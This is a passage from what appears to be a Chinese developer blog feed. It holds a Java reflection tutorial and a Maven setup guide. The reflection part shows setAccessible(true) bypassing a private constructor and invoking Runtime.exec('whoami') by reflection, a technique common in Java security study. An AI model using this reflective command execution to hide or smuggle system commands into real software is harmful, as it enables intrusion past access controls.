title="获取构造方法"></a>获取构造方法</h2><p>在Java的<strong>任何一个类都必须有一个或多个构造方法</strong>，如果代码中没有创建构造方法那么在类编译的时候会自动创建一个无参数的构造方法。</p><h3 id="getDeclaredConstructor"><a href="#getDeclaredConstructor" class="headerlink" title="getDeclaredConstructor()"></a><code>getDeclaredConstructor()</code></h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Constructor constructor = name.getDeclaredConstructor();</span><br></pre></td></tr></table></figure><blockquote><p>没有访问构造方法权限时调用<code>constructor.setAccessible(true);</code>修改访问权限就可以成功的创建出类实例。</p></blockquote><h3 id="getConstructor"><a href="#getConstructor" class="headerlink" title="getConstructor()"></a><code>getConstructor()</code></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Constructor constructor = name.getConstructor();</span><br></pre></td></tr></table></figure><blockquote><p>无法获取到私有方法</p></blockquote><p><strong>构造方法有一个或多个参数的情况下我们应该在获取构造方法时候传入对应的参数类型数组</strong></p><p>如：Car类</p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211231005233544.png" alt="image-20211231005233544"></p><p><code>Constructor constructor = name.getDeclaredConstructor(String.class, int.class);</code></p><p>或者如下代码：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Class[] classes = <span class="keyword">new</span> Class[] &#123; String.class, <span class="keyword">int</span>.class &#125;;</span><br><span class="line">Constructor constructor = name.getDeclaredConstructor(classes);</span><br></pre></td></tr></table></figure><p><strong>获取类的所有构造方法</strong>可以使用：<code>name.getDeclaredConstructors</code>来获取一个<code>Constructor</code>数组</p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211231005050728.png" alt="image-20211231005050728"></p><blockquote><p>后续创建类实例，同理如果有参数的情况下应该传入对应的参数值，如:<code>constructor.newInstance(&quot;admin&quot;, &quot;123456&quot;)</code></p></blockquote><h2 id="获取Class类的实例"><a href="#获取Class类的实例" class="headerlink" title="获取Class类的实例"></a>获取Class类的实例</h2><p>调用Class对象的<code>newInstance()</code>方法：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Object runtimeInstance = constructor.newInstance();</span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test10</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        String className = <span class="string">&quot;com.drop.test.Person&quot;</span>;</span><br><span class="line">        ClassLoader classLoader = <span class="keyword">this</span>.getClass().getClassLoader();</span><br><span class="line">        Class clazz = classLoader.loadClass(className);</span><br><span class="line">        Object obj = clazz.newInstance();</span><br><span class="line">        Person p  = (Person) obj;</span><br><span class="line">        System.out.println(p);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h2 id="获取当前类指定的成员方法"><a href="#获取当前类指定的成员方法" class="headerlink" title="获取当前类指定的成员方法"></a>获取当前类指定的成员方法</h2><h3 id="getDeclaredMethods"><a href="#getDeclaredMethods" class="headerlink" title="getDeclaredMethods()"></a><code>getDeclaredMethods()</code></h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test8</span><span class="params">()</span> <span class="keyword">throws</span> ClassNotFoundException </span>&#123;</span><br><span class="line">Class&lt;?&gt; name = ClassLoader.getSystemClassLoader().loadClass(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">Method[] declaredMethods = name.getDeclaredMethods();</span><br><span class="line"><span class="keyword">for</span>(Method m:declaredMethods)&#123;</span><br><span class="line">System.out.println(m);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>能获取到当前类的所有成员方法(不包含父类)。</p></blockquote><h3 id="getMethods"><a href="#getMethods" class="headerlink" title="getMethods()"></a><code>getMethods()</code></h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test8</span><span class="params">()</span> <span class="keyword">throws</span> ClassNotFoundException </span>&#123;</span><br><span class="line">Class&lt;?&gt; name = Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">    Method[] methods = name.getMethods();</span><br><span class="line"><span class="keyword">for</span>(Method m:methods)&#123;</span><br><span class="line">System.out.println(m);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>只能获取到<strong>当前类和父类</strong>的所有有权限的方法(如：<code>public</code>)</p></blockquote><h3 id="getMethod"><a href="#getMethod" class="headerlink" title="getMethod()"></a><code>getMethod()</code></h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test8</span><span class="params">()</span> <span class="keyword">throws</span> NoSuchMethodException </span>&#123;</span><br><span class="line">Class&lt;?&gt; name = Runtime.class;</span><br><span class="line">Method method = name.getMethod(<span class="string">&quot;exec&quot;</span>, String.class);</span><br><span class="line">System.out.println(method);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>只能返回一个特定的方法，第一参数为方法名称，后面的参数为方法的参数对应Class的对象。</p></blockquote><h3 id="getDeclaredMethod"><a href="#getDeclaredMethod" class="headerlink" title="getDeclaredMethod()"></a><code>getDeclaredMethod()</code></h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test8</span><span class="params">()</span> <span class="keyword">throws</span> NoSuchMethodException </span>&#123;</span><br><span class="line">Runtime rt = Runtime.getRuntime();</span><br><span class="line">Class&lt;?&gt; name = rt.getClass();</span><br><span class="line">Method method = name.getDeclaredMethod(<span class="string">&quot;exec&quot;</span>, String.class);</span><br><span class="line">System.out.println(method);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>只能返回一个特定的方法，第一参数为方法名称,第二个参数名是方法参数</p></blockquote><h2 id="反射调用方法invoke"><a href="#反射调用方法invoke" class="headerlink" title="反射调用方法invoke"></a>反射调用方法invoke</h2><ol><li>invoke调用普通方法时，传入的必须是实例化后的类。</li><li>invoke调用静态方法时，传入类即可。</li></ol><p>获取到<code>java.lang.reflect.Method</code>对象以后我们可以通过<code>Method</code>的<code>invoke</code>方法来调用类方法。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">method.invoke(方法实例对象, 方法参数值，多个参数值用<span class="string">&quot;,&quot;</span>隔开);</span><br></pre></td></tr></table></figure><p><code>method.invoke</code>的第一个参数必须是类实例对象，如果调用的是<code>static</code>方法那么第一个参数值可以传<code>null</code>，因为在java中调用静态方法是不需要有类实例的，因为可以直接<code>类名.方法名(参数)</code>的方式调用。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Class&lt;?&gt; cmdClass = curl.loadClass(<span class="string">&quot;com.drop.test.CMD&quot;</span>);</span><br><span class="line">Process process = (Process) cmdClass.getMethod(<span class="string">&quot;exec&quot;</span>, String.class).invoke(<span class="keyword">null</span>,cmd);</span><br><span class="line"><span class="comment">//同下</span></span><br><span class="line">Process process = (Process) cmdClass.getMethod(<span class="string">&quot;exec&quot;</span>, String.class).invoke(cmdClass,cmd);</span><br></pre></td></tr></table></figure><p><code>method.invoke</code>的第二个参数不是必须的，如果当前调用的方法没有参数，那么第二个参数可以不传，如果有参数那么就必须严格的<strong>依次传入对应的参数类型</strong>。</p><h2 id="调用类成员变量"><a href="#调用类成员变量" class="headerlink" title="调用类成员变量"></a>调用类成员变量</h2><p>Java反射不但可以获取类所有的成员变量名称，还可以无视权限修饰符实现修改对应的值。</p><h3 id="getDeclaredFields"><a href="#getDeclaredFields" class="headerlink" title="getDeclaredFields"></a>getDeclaredFields</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Field[] fields = clazz.getDeclaredFields();</span><br></pre></td></tr></table></figure><blockquote><p>获取当前类的<strong>所有</strong>成员变量</p></blockquote><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Field field  = clazz.getDeclaredField(<span class="string">&quot;变量名&quot;</span>);</span><br></pre></td></tr></table></figure><blockquote><p>获取当前类<strong>指定</strong>的成员变量：</p></blockquote><h3 id="getFields"><a href="#getFields" class="headerlink" title="getFields"></a>getFields</h3><p>用法同上，区别同获取当前类指定的成员方法。</p><h1 id="获取Runtime类Class对象"><a href="#获取Runtime类Class对象" class="headerlink" title="获取Runtime类Class对象"></a>获取Runtime类Class对象</h1><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@Test</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">test</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="comment">//不使用反射执行本地命令代码片段 导入import org.apache.commons.io.IOUtils;</span></span><br><span class="line">      System.out.println(IOUtils.toString(Runtime.getRuntime().exec(<span class="string">&quot;whoami&quot;</span>).getInputStream(), <span class="string">&quot;UTF-8&quot;</span>));</span><br><span class="line">        <span class="comment">//使用反射</span></span><br><span class="line">        <span class="comment">//获取Runtime类对象</span></span><br><span class="line">        String className = <span class="string">&quot;java.lang.Runtime&quot;</span>;</span><br><span class="line">        Class runtimeClass1 = Class.forName(className);</span><br><span class="line">        <span class="comment">// 获取构造</span></span><br><span class="line">        Constructor constructor = runtimeClass1.getDeclaredConstructor();</span><br><span class="line">        constructor.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        <span class="comment">// 创建Runtime类实例，等价于 Runtime rt = new Runtime();</span></span><br><span class="line">        Object runtimeInstance = constructor.newInstance();</span><br><span class="line">        <span class="comment">// 获取Runtime的exec(String cmd)方法</span></span><br><span class="line">        Method runtimeMethod = runtimeClass1.getMethod(<span class="string">&quot;exec&quot;</span>, String.class);</span><br><span class="line">        <span class="comment">// 调用exec方法，等价于 rt.exec(cmd);</span></span><br><span class="line">        Process process = (Process) runtimeMethod.invoke(runtimeInstance, <span class="string">&quot;whoami&quot;</span>);</span><br><span class="line">        <span class="comment">// 获取命令执行结果</span></span><br><span class="line">        InputStream in = process.getInputStream();</span><br><span class="line">        <span class="comment">// 输出命令执行结果</span></span><br><span class="line">        System.out.println(IOUtils.toString(in, <span class="string">&quot;UTF-8&quot;</span>));</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><blockquote><p><code>java.lang.Runtime</code>因为有一个<code>exec</code>方法可以执行本地命令</p></blockquote>]]></content>
      
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>maven</title>
      <link href="/p/c6e613d8.html"/>
      <url>/p/c6e613d8.html</url>
      
        <content type="html"><![CDATA[<p>Apache Maven，是一个软件（特别是Java软件）项目管理及自动构建工具，由Apache软件基金会所提供。基于项目对象模型（缩写：POM）概念，Maven利用一个中央信息片断能管理一个项目的构建、报告和文档等步骤。</p><h1 id="Maven"><a href="#Maven" class="headerlink" title="Maven"></a>Maven</h1><h2 id="存在意义"><a href="#存在意义" class="headerlink" title="存在意义"></a>存在意义</h2><ol><li>项目庞大，不适合使用package来划分模块，借助于Maven将一个项目拆分成多个工程。</li><li>原本jar需要复制到<code>WEB-INF/lib</code>工程臃肿，借助于Maven将jar包保存在”仓库”中，有需要”引用”文件接口。</li><li>一个jar包依赖的其他jar包需要手动加入项目，借助于Maven将被依赖的jar包导入进来。</li></ol><p>运行时环境：其实是jar包的引用，并没有把jar包复制进工程。</p><h2 id="四大特性"><a href="#四大特性" class="headerlink" title="四大特性"></a>四大特性</h2><h3 id="依赖管理系统"><a href="#依赖管理系统" class="headerlink" title="依赖管理系统"></a>依赖管理系统</h3><p>在Java中可以用<code>groupId</code>，<code>artifactId</code>，<code>version</code>组成<code>Coordination</code>(坐标)唯一标识一个依赖。</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">groupId</span>&gt;</span>javax.servlet<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>javax.servlet-api<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">version</span>&gt;</span>3.1.0<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">scope</span>&gt;</span>provided<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>groupId：定义当前目录隶属的实际项目（jar包所在仓库路径）</p><p>artifactId：定义实际项目中的一个Maven模块-项目名，推荐实际项目名称作为artifactId前缀</p><p>version：Maven项目当前所处版本</p></blockquote><h3 id="多模块构建"><a href="#多模块构建" class="headerlink" title="多模块构建"></a>多模块构建</h3><h3 id="一致的项目结构"><a href="#一致的项目结构" class="headerlink" title="一致的项目结构"></a>一致的项目结构</h3><p>解决不同idea不同的目录结构</p><h3 id="一致的构建模型和插件机制"><a href="#一致的构建模型和插件机制" class="headerlink" title="一致的构建模型和插件机制"></a>一致的构建模型和插件机制</h3><h2 id="Maven安装与配置"><a href="#Maven安装与配置" class="headerlink" title="Maven安装与配置"></a>Maven安装与配置</h2><p>下载地址</p><p><a href="https://maven.apache.org/download.cgi#">https://maven.apache.org/download.cgi#</a></p><p>配置环境变量</p><p><code>MAVEN_HOME</code>    <code>D:\apache-maven-3.8.4\bin</code>    <code>%MAVEN_HOME%</code></p><h2 id="目录结构"><a href="#目录结构" class="headerlink" title="目录结构"></a>目录结构</h2><table><thead><tr><th>目录</th><th>描述</th></tr></thead><tbody><tr><td><code>$&#123;basedir&#125;</code></td><td>存放<code>pom.xml</code>和所有子目录。</td></tr><tr><td><code>$&#123;basedir&#125;/src/main/java</code></td><td>java源代码</td></tr><tr><td><code>$&#123;basedir&#125;/src/main/resources</code></td><td>项目的资源，如<code>property</code>文件</td></tr><tr><td><code>$&#123;basedir&#125;/src/test/java</code></td><td>项目的测试类，如<code>JUnit</code>文件</td></tr><tr><td><code>$&#123;basedir&#125;/src/test/resources</code></td><td>测试使用的资源</td></tr></tbody></table><h2 id="修改settings-xml"><a href="#修改settings-xml" class="headerlink" title="修改settings.xml"></a>修改<code>settings.xml</code></h2><h3 id="修改默认仓库位置"><a href="#修改默认仓库位置" class="headerlink" title="修改默认仓库位置"></a>修改默认仓库位置</h3><p>打开maven目录 –&gt;<code>conf/settings.xml</code></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- localRepository</span></span><br><span class="line"><span class="comment"> | The path to the local repository maven will use to store artifacts.</span></span><br><span class="line"><span class="comment"> |</span></span><br><span class="line"><span class="comment"> | Default: $&#123;user.home&#125;/.m2/repository</span></span><br><span class="line"><span class="comment">&lt;localRepository&gt;/path/to/local/repo&lt;/localRepository&gt;</span></span><br><span class="line"><span class="comment">--&gt;</span></span><br></pre></td></tr></table></figure><blockquote><p>位置改为自己本机指定目录，<code>/</code>不要写反。</p></blockquote><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">localRepository</span>&gt;</span>D:/apache-maven-3.8.4/repo<span class="tag">&lt;/<span class="name">localRepository</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="修改仓库源"><a href="#修改仓库源" class="headerlink" title="修改仓库源"></a>修改仓库源</h3><p><a href="https://developer.aliyun.com/mvn/guide">https://developer.aliyun.com/mvn/guide</a></p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">mirror</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">id</span>&gt;</span>aliyunmaven<span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">mirrorOf</span>&gt;</span>*<span class="tag">&lt;/<span class="name">mirrorOf</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">name</span>&gt;</span>阿里云公共仓库<span class="tag">&lt;/<span class="name">name</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">url</span>&gt;</span>https://maven.aliyun.com/repository/public<span class="tag">&lt;/<span class="name">url</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">mirror</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="编译执行"><a href="#编译执行" class="headerlink" title="编译执行"></a>编译执行</h3><p>进入项目的根目录</p><p>编译java文件 <code>mvn xxx</code></p><p>执行main方法</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mvn exec:java <span class="literal">-Dexec</span>.mainClass=<span class="string">&quot;com.xxx.xxx.TextDemo(类名)&quot;</span></span><br></pre></td></tr></table></figure><p>报错：</p><ol><li>不是使用管理员权限</li><li>JDK环境配置问题</li><li>包名类名路径错误</li></ol><h1 id="Maven命令"><a href="#Maven命令" class="headerlink" title="Maven命令"></a>Maven命令</h1><table><thead><tr><th>命令</th><th>描述</th></tr></thead><tbody><tr><td>mvn -v, –version</td><td>显示版本信息</td></tr><tr><td>mvn clean</td><td>清除产生的项目</td></tr><tr><td>mvn package</td><td>打包</td></tr><tr><td>mvn test</td><td>运行测试</td></tr><tr><td>mvn compile</td><td>编译源代码</td></tr><tr><td>mvn install</td><td>在本地 Repository 中安装 jar</td></tr><tr><td>mvn deploy</td><td>将打包文件发布到远程参考</td></tr><tr><td>mvn site</td><td>生成项目相关信息的网站</td></tr><tr><td>mvn eclipse:eclipse</td><td>生成eclipse项目，idea同理</td></tr><tr><td>mvn dependency:tree</td><td>打印整个依赖树</td></tr></tbody></table><h1 id="IDEA编辑器集成Maven环境"><a href="#IDEA编辑器集成Maven环境" class="headerlink" title="IDEA编辑器集成Maven环境"></a>IDEA编辑器集成Maven环境</h1><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211227192352962.png" alt="image-20211227192352962"></p><p>设置配置文件路径和本地仓库路径</p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211227193905949.png" alt="image-20211227193905949"></p><h1 id="Maven创建项目"><a href="#Maven创建项目" class="headerlink" title="Maven创建项目"></a>Maven创建项目</h1><h2 id="创建Java项目"><a href="#创建Java项目" class="headerlink" title="创建Java项目"></a>创建Java项目</h2><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211227194320510.png" alt="image-20211227194320510"></p><p>设置项目名称和路径</p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211227194418411.png" alt="image-20211227194418411"></p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211227200053102.png" alt="image-20211227200053102"></p><h4 id="设置目录结构"><a href="#设置目录结构" class="headerlink" title="设置目录结构"></a>设置目录结构</h4><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211227203035330.png" alt="image-20211227203035330"></p><h4 id="编译项目"><a href="#编译项目" class="headerlink" title="编译项目"></a>编译项目</h4><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211227204151806.png" alt="image-20211227204151806"></p><h4 id="打包成jar包"><a href="#打包成jar包" class="headerlink" title="打包成jar包"></a>打包成jar包</h4><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211227203914718.png" alt="image-20211227203914718"></p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211227203810302.png" alt="image-20211227203810302"></p><h2 id="创建web项目"><a href="#创建web项目" class="headerlink" title="创建web项目"></a>创建web项目</h2><h3 id="创建项目"><a href="#创建项目" class="headerlink" title="创建项目"></a>创建项目</h3><p>模板选择webapp</p><p><img src="https://test-pic-test.oss-cn-guangzhou.aliyuncs.com/img/image-20211227204406928.png" alt="image-20211227204406928"></p><h4 id="修改jdk版本"><a href="#修改jdk版本" class="headerlink" title="修改jdk版本"></a>修改jdk版本</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">properties</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">project.build.sourceEncoding</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">project.build.sourceEncoding</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">maven.compiler.source</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">maven.compiler.source</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">maven.compiler.target</span>&gt;</span>1.8<span class="tag">&lt;/<span class="name">maven.compiler.target</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">properties</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="设置单元测试版本为4-12"><a href="#设置单元测试版本为4-12" class="headerlink" title="设置单元测试版本为4.12"></a>设置单元测试版本为4.12</h4><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependencies</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>junit<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>4.12<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">scope</span>&gt;</span>test<span class="tag">&lt;/<span class="name">scope</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependencies</span>&gt;</span></span><br></pre></td></tr></table></figure><h4 id="删除pluginManagement标签"><a href="#删除pluginManagement标签" class="headerlink" title="删除pluginManagement标签"></a>删除pluginManagement标签</h4><p><code>&lt;pluginManagement...&gt;</code></p><h4 id="设置web插件"><a href="#设置web插件" class="headerlink" title="设置web插件"></a>设置web插件</h4><p>jetty</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!--jetty--&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.mortbay.jetty<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>maven-jetty-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>6.1.25<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">          <span class="comment">&lt;!--热部署，每10s扫描一次--&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">scanIntervalSeconds</span>&gt;</span>10<span class="tag">&lt;/<span class="name">scanIntervalSeconds</span>&gt;</span></span><br><span class="line">          <span class="comment">&lt;!--项目站点路径--&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">contextPath</span>&gt;</span>/abc<span class="tag">&lt;/<span class="name">contextPath</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">connectors</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">connector</span> <span class="attr">implementation</span>=<span class="string">&quot;org.mortbay.jetty.nio.SelectChannelConnector&quot;</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">port</span>&gt;</span>9090<span class="tag">&lt;/<span class="name">port</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">connector</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">connectors</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br></pre></td></tr></table></figure><p>tomcat7</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">plugin</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.apache.tomcat.maven<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>tomcat7-maven-plugin<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">version</span>&gt;</span>2.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">configuration</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">port</span>&gt;</span>8081<span class="tag">&lt;/<span class="name">port</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">path</span>&gt;</span>/test<span class="tag">&lt;/<span class="name">path</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">uriEncoding</span>&gt;</span>UTF-8<span class="tag">&lt;/<span class="name">uriEncoding</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">server</span>&gt;</span>tomcat7<span class="tag">&lt;/<span class="name">server</span>&gt;</span> <span class="comment">&lt;!--服务器名称--&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">configuration</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">plugin</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="启动项目"><a href="#启动项目" class="headerlink" 